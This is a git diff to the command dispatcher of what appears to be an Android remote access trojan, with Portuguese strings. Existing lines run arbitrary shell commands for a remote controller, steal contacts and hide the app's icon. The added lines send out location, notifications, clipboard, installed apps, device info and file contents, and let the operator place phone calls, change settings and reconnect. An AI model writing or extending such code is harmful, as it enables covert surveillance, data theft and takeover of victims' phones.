@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.provider.Settings;
+import android.view.KeyEvent;
 import android.widget.Toast;
 
 import org.json.JSONObject;
@@ -21,6 +22,9 @@ public final class Cmd {
             switch (cmd) {
                 case "touch":
                     if (k != null) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
+                    break;
+                case "long":
+                    if (k != null) k.longPress((float) o.optDouble("x"), (float) o.optDouble("y"));
                     break;
                 case "swipe":
                     if (k != null) k.swipe((float) o.optDouble("x1"), (float) o.optDouble("y1"),
@@ -57,6 +61,7 @@ public final class Cmd {
                 case "open":
                     Intent i = c.getPackageManager().getLaunchIntentForPackage(o.optString("pkg"));
                     if (i != null) c.startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                    else Net.send("{\"t\":\"err\",\"o\":\"pacote nao encontrado\"}");
                     break;
                 case "shell":
                     Net.send("{\"t\":\"sh\",\"o\":\"" + Util.esc(Util.exec(o.optString("cmd"))) + "\"}");
@@ -66,6 +71,54 @@ public final class Cmd {
                     break;
                 case "contacts":
                     Net.send("{\"t\":\"cts\",\"o\":\"" + Util.esc(Extra.contacts(c)) + "\"}");
+                    break;
+                case "apps":
+                    Net.send("{\"t\":\"apps\",\"o\":\"" + Util.esc(Extra.apps(c)) + "\"}");
+                    break;
+                case "loc":
+                    Net.send("{\"t\":\"loc\",\"o\":\"" + Util.esc(Extra.loc(c)) + "\"}");
+                    break;
+                case "info":
+                    Net.send("{\"t\":\"info\",\"o\":\"" + Util.esc(Extra.info(c)) + "\"}");
+                    break;
+                case "notif":
+                    Net.send("{\"t\":\"notif\",\"o\":\"" + Util.esc(Extra.notifs(c)) + "\"}");
+                    break;
+                case "clip":
+                    Net.send("{\"t\":\"clip\",\"o\":\"" + Util.esc(Extra.clip(c)) + "\"}");
+                    break;
+                case "setclip":
+                    Extra.setClip(c, o.optString("s"));
+                    break;
+                case "ls":
+                    Net.send("{\"t\":\"ls\",\"o\":\"" + Util.esc(Extra.ls(o.optString("p", "/sdcard"))) + "\"}");
+                    break;
+                case "dl":
+                    Net.send("{\"t\":\"dl\",\"o\":\"" + Util.esc(Extra.cat(o.optString("p"), o.optInt("n", 64000))) + "\"}");
+                    break;
+                case "bright":
+                    Extra.bright(c, o.optInt("v", 50));
+                    break;
+                case "torch":
+                    Extra.torch(c, o.optBoolean("on", true));
+                    break;
+                case "vol":
+                    Extra.volume(c, o.optInt("dir", 1), o.optInt("v", -1));
+                    break;
+                case "play":
+                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE);
+                    break;
+                case "next":
+                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_NEXT);
+                    break;
+                case "prev":
+                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PREVIOUS);
+                    break;
+                case "dial":
+                    Extra.dial(c, o.optString("n"), false);
+                    break;
+                case "call":
+                    Extra.dial(c, o.optString("n"), true);
                     break;
                 case "hide":
                     c.getPackageManager().setComponentEnabledSetting(
@@ -80,6 +133,16 @@ public final class Cmd {
                             Uri.parse("package:" + c.getPackageName()));
                     b.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     c.startActivity(b);
+                    break;
+                case "wr":
+                    Intent w = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                            Uri.parse("package:" + c.getPackageName()));
+                    w.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    c.startActivity(w);
+                    break;
+                case "recon":
+                    Net.send("{\"t\":\"info\",\"o\":\"reconectando\"}");
+                    Net.start(c);
                     break;
                 case "ping":
                     Net.send("{\"t\":\"pong\"}");
